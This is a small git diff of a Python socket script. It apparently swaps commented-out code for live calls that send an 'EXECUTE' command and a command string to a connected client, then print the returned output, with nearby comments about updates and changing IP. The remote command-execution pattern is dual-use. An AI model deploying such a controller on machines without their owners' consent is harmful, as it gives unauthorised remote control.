@@ -59,19 +59,14 @@ if __name__ == '__main__':
         # conn.send("END_UPDATE".encode())
         # data = conn.recv(BUFFER_SIZE)  # ok for packgae
 
-        # # Execute
-        # conn.send("EXECUTE".encode())
-        # data = conn.recv(2)  # ok for packgae
-        # packet = EXE_STR
-        # conn.send(packet.encode())
-        # data = conn.recv(2)  # ok for packgae
-        # # get response
-        # data = conn.recv(BUFFER_SIZE * 100)
-        # conn.send("OK".encode())
-        # print("hsgfasygdfjksd")
-        # print(data.decode())  # TODO handle /n
-        # conn.send("END_EXECUTE".encode())
-        # data = conn.recv(BUFFER_SIZE)  # ok for packgae
+        # Execute
+        SocketManager.send_data(conn, "EXECUTE")
+        packet = EXE_STR
+        SocketManager.send_data(conn, packet)
+
+        data = SocketManager.receive(conn)
+
+        print(data)  # TODO handle /n
 
         # Change IP
         while True: # TODO: timeout or scheduler
